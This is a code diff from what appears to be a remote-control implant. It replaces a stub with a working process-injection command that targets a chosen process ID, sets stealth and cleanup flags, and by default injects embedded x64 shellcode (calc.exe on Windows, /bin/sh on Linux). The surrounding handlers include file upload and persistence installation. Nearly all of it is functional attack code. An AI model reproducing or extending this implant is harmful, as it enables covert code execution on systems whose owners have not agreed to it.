@@ -5,6 +5,7 @@
 #include "commands.h"
 #include "utils.h"
 #include "config.h"
+#include "../inject/inject_core.h"
 
 #include <stdio.h>
 #include <string.h>
@@ -548,24 +549,98 @@ int cmd_upload(const uint8_t* args, size_t args_len, uint8_t* output, size_t* ou
     return ERR_SUCCESS;
 }
 
-// Process injection stub
+// Process injection implementation  
 int cmd_inject(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
-    (void)args;
-    (void)args_len;
     
-#ifdef PLATFORM_WINDOWS
-    const char* msg = "Process injection ready (Windows)";
-#elif defined(PLATFORM_LINUX)
-    const char* msg = "Process injection ready (Linux)";
-#else
-    const char* msg = "Process injection not implemented";
-#endif
+    if (args_len < sizeof(uint32_t) + 1) {
+        const char* err = "Usage: inject <pid> <technique> [payload]";
+        mem_cpy(output, err, str_len(err));
+        *output_len = str_len(err);
+        return ERR_INVALID_PARAM;
+    }
     
-    size_t msg_len = str_len(msg);
-    mem_cpy(output, msg, msg_len);
-    *output_len = msg_len;
+    // Parse arguments
+    uint32_t target_pid = *(uint32_t*)args;
+    uint8_t technique = args[sizeof(uint32_t)];
     
-    return ERR_SUCCESS;
+    // Default payload (calc.exe or /bin/sh)
+    uint8_t default_payload[] = {
+        #ifdef PLATFORM_WINDOWS
+            // Windows x64 shellcode to execute calc.exe
+            0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdd, 0xff, 0xff, 0xff,
+            0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x7d,
+            0x33, 0x82, 0x0e, 0xbf, 0x6a, 0xe1, 0x5f, 0x48, 0x31, 0x58,
+            0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0x81,
+            0x5b, 0x01, 0xea, 0x4f, 0x82, 0x21, 0x5f, 0x7d, 0x33, 0xc3,
+            0x5e, 0xfe, 0x3a, 0xb3, 0x0e, 0x2b, 0x5b, 0xb3, 0xdc, 0xda,
+            0x22, 0x6a, 0x0d, 0x1d, 0x5b, 0x09, 0x5c, 0xa7, 0x22, 0x6a,
+            0x0d, 0x5d, 0x5b, 0x09, 0x7c, 0xef, 0x22, 0x4e, 0xe8, 0x37,
+            0x7a, 0xca, 0x47, 0x34, 0x22, 0xd5, 0x96, 0x3f, 0x72, 0xd0,
+            0xc6, 0xb6, 0x2b, 0xc1, 0x1e, 0x35, 0x0a, 0xcb, 0x56, 0x7e,
+            0xab, 0x84, 0xd4, 0xf3, 0xc3, 0x46, 0xc7, 0x2b, 0x91, 0x17,
+            0x7c, 0x72, 0xca, 0x47, 0x34, 0x22, 0xd5, 0x96, 0xb2, 0x72,
+            0x46, 0x82, 0x2a, 0x4f, 0x17, 0x7b, 0x2e, 0x16, 0xce, 0x31,
+            0xe6, 0xea, 0x68, 0x94, 0xf6, 0xa9, 0x13, 0xf4, 0x52, 0xd2,
+            0x4f, 0xf7, 0x3a, 0xa9, 0x07, 0xc4, 0x7b, 0xb3, 0xdc, 0xda,
+            0x22, 0x6a, 0x0d, 0x1d, 0x72, 0xc3, 0x87, 0xb7, 0x22, 0xa0,
+            0x1e, 0x7d, 0x7b, 0x50, 0x46, 0xf7, 0x7c, 0xe5, 0xd6, 0x2c,
+            0x6a, 0xce, 0x5f, 0x34, 0x6a, 0xa9, 0x1e, 0x7c, 0xcc, 0xca,
+            0x5f, 0x34, 0xad, 0xa8, 0x17, 0xf6, 0xf2, 0xca, 0x5f, 0xb6,
+            0x7c, 0xa8, 0x5a, 0xe7, 0x22, 0x4e, 0xe8, 0x3c, 0x0a, 0xca,
+            0x4f, 0x37, 0x62, 0xe5, 0xa5, 0x82, 0xcc, 0xda, 0x46, 0xe7,
+            0x88, 0x7a, 0xa0
+        #else
+            // Linux x64 shellcode to execute /bin/sh
+            0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e,
+            0x2f, 0x73, 0x68, 0x53, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x31,
+            0xf6, 0x0f, 0x05
+        #endif
+    };
+    
+    // Setup injection configuration
+    inject_config_t config = {0};
+    config.target_pid = target_pid;
+    config.technique = (inject_technique_t)technique;
+    config.flags = INJECT_FLAG_STEALTH | INJECT_FLAG_CLEANUP;
+    
+    // Use provided payload or default
+    if (args_len > sizeof(uint32_t) + 1) {
+        config.payload = (uint8_t*)(args + sizeof(uint32_t) + 1);
+        config.payload_size = args_len - sizeof(uint32_t) - 1;
+    } else {
+        config.payload = default_payload;
+        config.payload_size = sizeof(default_payload);
+    }
+    
+    // Initialize injection framework
+    inject_status_t status = inject_init();
+    if (status != INJECT_SUCCESS) {
+        const char* err = "Failed to initialize injection framework";
+        mem_cpy(output, err, str_len(err));
+        *output_len = str_len(err);
+        return -1;  // Generic error
+    }
+    
+    // Execute injection
+    status = inject_execute(&config);
+    
+    // Cleanup
+    inject_cleanup();
+    
+    // Return result
+    if (status == INJECT_SUCCESS) {
+        const char* msg = "Injection successful";
+        mem_cpy(output, msg, str_len(msg));
+        *output_len = str_len(msg);
+        return ERR_SUCCESS;
+    } else {
+        char msg[256];
+        int len = snprintf(msg, sizeof(msg), "Injection failed: %s", 
+                          inject_status_to_string(status));
+        mem_cpy(output, msg, len);
+        *output_len = len;
+        return -1;  // Generic error
+    }
 }
 
 // Install persistence
